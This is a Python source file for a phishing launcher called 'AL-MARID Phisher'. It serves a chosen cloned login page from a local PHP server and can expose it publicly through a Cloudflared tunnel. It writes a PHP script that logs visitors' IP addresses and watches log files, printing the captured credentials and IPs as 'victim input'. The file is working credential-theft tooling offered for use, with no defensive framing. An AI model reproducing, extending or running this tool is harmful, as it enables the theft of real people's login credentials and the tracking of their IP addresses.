import os
import time
from threading import Thread
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def clear():
    os.system("clear")

def banner():
    ascii_logo = r"""
    ___    __         __  ______    ____  ________        ____  __    _      __
   /   |  / /        /  |/  /   |  / __ \/  _/ __ \      / __ \/ /_  (_)____/ /_  ___  _____
  / /| | / /  ______/ /|_/ / /| | / /_/ // // / / /_____/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
 / ___ |/ /__/_____/ /  / / ___ |/ _, _// // /_/ /_____/ ____/ / / / (__  ) / / /  __/ /
/_/  |_/_____/    /_/  /_/_/  |_/_/ |_/___/_____/     /_/   /_/ /_/_/____/_/ /_/\___/_/
"""
    console.print(f"[bold red]{ascii_logo}[/bold red]")
    console.print(Panel("[bold red]Welcome to AL-MARID Phisher • All Sites Included[/bold red]"))

def list_sites():
    sites_path = "sites"
    return sorted([
        f for f in os.listdir(sites_path)
        if os.path.isdir(os.path.join(sites_path, f)) and not f.startswith("__")
    ])

def menu(sites):
    table = Table(title="[red]Select Target Website[/red]")
    table.add_column("ID", style="bold white", justify="center")
    table.add_column("Service", style="bold red", justify="center")

    for i, target in enumerate(sites, 1):
        table.add_row(f"{i:02d}", target)

    console.print(table)

def watch_input():
    login_path = "site/login.txt"
    ip_path = "site/ip.txt"

    for path in [login_path, ip_path]:
        if not os.path.exists(path):
            open(path, "w").close()

    console.print("\n[bold yellow]Waiting for victim input...[/bold yellow]\n")

    with open(login_path, "r") as login_file, open(ip_path, "r") as ip_file:
        login_file.seek(0, os.SEEK_END)
        ip_file.seek(0, os.SEEK_END)
        while True:
            login_line = login_file.readline()
            ip_line = ip_file.readline()

            if login_line:
                console.print(f"[bold green][+][/bold green] {login_line.strip()}")

            if ip_line:
                console.print(f"[bold cyan][IP][/bold cyan] {ip_line.strip()}")

            time.sleep(1)

def create_ip_file_if_needed():
    ip_php_path = "site/ip.php"
    if not os.path.exists(ip_php_path):
        with open(ip_php_path, "w") as f:
            f.write("""<?php
$ip = $_SERVER['REMOTE_ADDR'];
file_put_contents("ip.txt", "IP: $ip\\n", FILE_APPEND);
?>""")
        console.print("[bold cyan][~][/bold cyan] Created missing [bold white]ip.php[/bold white] automatically")

def start_server():
    console.print("\n[bold red][*][/bold red] Choose Tunnel Method:")
    console.print("[bold white][1][/bold white] Localhost (http://127.0.0.1:8080)")
    console.print("[bold white][2][/bold white] Cloudflared Tunnel\n")

    tunnel = input(">> Enter option [1 or 2]: ").strip()

    os.system("pkill php >/dev/null 2>&1")
    os.system("php -S 127.0.0.1:8080 -t site > /dev/null 2>&1 &")
    time.sleep(1)

    Thread(target=watch_input, daemon=True).start()

    if tunnel == "1":
        console.print("\n[bold green][+][/bold green] Localhost running at: [bold white]http://127.0.0.1:8080[/bold white]")
        console.input("\n[bold yellow]Press Enter to exit...[/bold yellow]")
    elif tunnel == "2":
        console.print("\n[bold yellow][~][/bold yellow] Starting Cloudflared tunnel...\n")
        os.system("cloudflared tunnel --url http://localhost:8080")
    else:
        console.print("\n[bold red][-] Invalid option![/bold red]")

def main():
    clear()
    banner()

    sites = list_sites()
    if not sites:
        console.print("[bold red]No phishing pages found in 'sites' folder.[/bold red]")
        return

    menu(sites)
    choice = console.input("\n[bold red]>> Enter ID to launch:[/bold red] ").strip()

    try:
        index = int(choice) - 1
        site_name = sites[index]

        # Clean previous site
        os.system("rm -rf site && mkdir site")

        # Copy selected site
        os.system(f"cp -r sites/{site_name}/* site/")

        used_file = None
        if os.path.exists("site/index.html"):
            used_file = "index.html"
        elif os.path.exists("site/login.html"):
            used_file = "login.html"

        # Check if any php file contains "include 'ip.php'"
        ip_needed = False
        for filename in os.listdir("site"):
            if filename.endswith(".php"):
                with open(f"site/{filename}", "r", errors="ignore") as f:
                    if "include 'ip.php'" in f.read():
                        ip_needed = True
                        break

        if ip_needed:
            create_ip_file_if_needed()

        if used_file:
            console.print(f"\n[bold green][+][/bold green] Site loaded: [white]{site_name}[/white] using {used_file}")
            start_server()
        else:
            console.print(f"\n[bold red][-] No index.html or login.html found in {site_name}[/bold red]")

    except (IndexError, ValueError):
        console.print("[bold red]Invalid selection.[/bold red]")

if __name__ == "__main__":
    main()
